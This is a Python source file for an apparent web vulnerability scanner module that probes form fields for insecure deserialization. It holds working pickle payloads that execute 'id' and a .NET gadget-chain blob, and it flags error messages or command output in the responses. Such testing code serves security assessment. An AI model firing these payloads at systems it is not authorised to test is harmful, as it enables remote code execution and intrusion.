import asyncio
import base64

class DeserializationTester:
    """Test for deserialization vulnerabilities"""
    
    def __init__(self):
        self.deserialization_payloads = {
            'java': [
                'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAABYXQAAWJ4',
                'aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017400016174000162'
            ],
            'php': [
                'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
                'a:1:{s:4:"test";s:4:"test";}',
                'O:4:"User":1:{s:4:"name";s:5:"admin";}'
            ],
            'python': [
                'cposix\nsystem\np0\n(S\'id\'\np1\ntp2\nRp3\n.',
                'c__builtin__\neval\np0\n(S\'__import__("os").system("id")\'\np1\ntp2\nRp3\n.'
            ],
            '.net': [
                '/wEyxBEAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQUBAAAAaFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZERpY3Rpb25hcnlgMltbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAABENvdW50CENvbXBhcmVyB1ZlcnNpb24ES2V5cwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAAAAAgAAAAkDAAAAAgAAAAkEAAAABAMAAACNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQEAAAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIJBQAAAAkGAAAABAQAAAAPU3lzdGVtLlN0cmluZ1tdAgAAAAYHAAAABHRlc3QGCAAAAARkYXRhBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkJAAAACQoAAAAJCwAAAAQJAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgwAAAArU3lzdGVtLkZ1bmNgMltbU3lzdGVtLlN0cmluZywgbXNjb3JsaWJdLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYl1dBg0AAAAKbXNjb3JsaWIKBg4AAAAJDwAAAAYQAAAAGlN5c3RlbS5GdW5jYDJbU3lzdGVtLlN0cmluZ10GEQAAAAdDb21wYXJlCQwAAAAECgAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgQAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQEBAQEGEgAAAAdDb21wYXJlBhMAAAAKbXNjb3JsaWIGFAAAABpTeXN0ZW0uRnVuY2AyW1N5c3RlbS5TdHJpbmddBhUAAAA+U3lzdGVtLlN0cmluZyBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBAoAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIEAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUBAQEBBhYAAAAHQ29tcGFyZQYXAAAACm1zY29ybGliBhgAAAAaU3lzdGVtLkZ1bmNgMltTeXN0ZW0uU3RyaW5nXQYZAAAAPlN5c3RlbS5TdHJpbmcgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQQGAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBAAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlAQEBAQYaAAAAB0NvbXBhcmUGGwAAAAptc2NvcmxpYgYcAAAAGlN5c3RlbS5GdW5jYDJbU3lzdGVtLlN0cmluZ10GHQAAADpTeXN0ZW0uSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQsPCw=='
            ]
        }
    
    async def test_deserialization(self, session, parameters):
        """Test for deserialization vulnerabilities"""
        findings = []
        
        for url, forms in parameters.items():
            for form in forms:
                for input_field in form['inputs']:
                    # Test parameters that might accept serialized data
                    if self._is_serialization_candidate(input_field):
                        deser_findings = await self._test_parameter_deserialization(
                            session, form, input_field
                        )
                        findings.extend(deser_findings)
        
        return findings
    
    def _is_serialization_candidate(self, input_field):
        """Check if parameter might accept serialized data"""
        param_name = input_field['name'].lower()
        serialization_indicators = [
            'data', 'object', 'payload', 'content', 'serialized', 'encoded',
            'state', 'session', 'cache', 'token', 'cookie'
        ]
        return any(indicator in param_name for indicator in serialization_indicators)
    
    async def _test_parameter_deserialization(self, session, form, input_field):
        """Test individual parameter for deserialization vulnerabilities"""
        findings = []
        
        # Test different serialization formats
        for format_type, payloads in self.deserialization_payloads.items():
            for payload in payloads[:2]:  # Limit payloads
                try:
                    # Test both raw and base64 encoded
                    test_payloads = [payload]
                    if format_type != 'php':  # PHP payloads are already readable
                        try:
                            encoded = base64.b64encode(payload.encode()).decode()
                            test_payloads.append(encoded)
                        except:
                            pass
                    
                    for test_payload in test_payloads:
                        data = {input_field['name']: test_payload}
                        
                        if form['method'].lower() == 'post':
                            async with session.post(form['action'], data=data) as response:
                                content = await response.text()
                                result = self._analyze_deserialization_response(
                                    content, test_payload, form, input_field, format_type
                                )
                                if result:
                                    findings.append(result)
                                    return findings  # Stop on first finding
                        else:
                            params = {input_field['name']: test_payload}
                            async with session.get(form['action'], params=params) as response:
                                content = await response.text()
                                result = self._analyze_deserialization_response(
                                    content, test_payload, form, input_field, format_type
                                )
                                if result:
                                    findings.append(result)
                                    return findings  # Stop on first finding
                        
                        await asyncio.sleep(0.3)  # Rate limiting
                        
                except Exception:
                    continue
        
        return findings
    
    def _analyze_deserialization_response(self, content, payload, form, input_field, format_type):
        """Analyze response for deserialization indicators"""
        # Check for serialization errors
        error_indicators = {
            'java': ['java.io.InvalidClassException', 'java.lang.ClassNotFoundException', 'ObjectInputStream'],
            'php': ['unserialize()', 'Notice: unserialize', 'Warning: unserialize'],
            'python': ['pickle.loads', 'cPickle.loads', 'pickle.UnpicklingError'],
            '.net': ['SerializationException', 'BinaryFormatter', 'System.Runtime.Serialization']
        }
        
        content_lower = content.lower()
        
        # Check for format-specific errors
        if format_type in error_indicators:
            for indicator in error_indicators[format_type]:
                if indicator.lower() in content_lower:
                    return {
                        'type': 'Deserialization Vulnerability',
                        'severity': 'HIGH',
                        'url': form['action'],
                        'parameter': input_field['name'],
                        'format': format_type,
                        'payload': payload[:50] + '...' if len(payload) > 50 else payload,
                        'description': f'{format_type.upper()} deserialization error detected',
                        'recommendation': 'Avoid deserializing untrusted data or implement strict validation'
                    }
        
        # Check for command execution indicators
        if any(indicator in content for indicator in ['uid=', 'gid=', '/bin/bash', '/bin/sh']):
            return {
                'type': 'Deserialization RCE',
                'severity': 'CRITICAL',
                'url': form['action'],
                'parameter': input_field['name'],
                'format': format_type,
                'payload': payload[:50] + '...' if len(payload) > 50 else payload,
                'description': f'{format_type.upper()} deserialization allows remote code execution',
                'recommendation': 'Immediately disable deserialization of untrusted data'
            }
        
        return None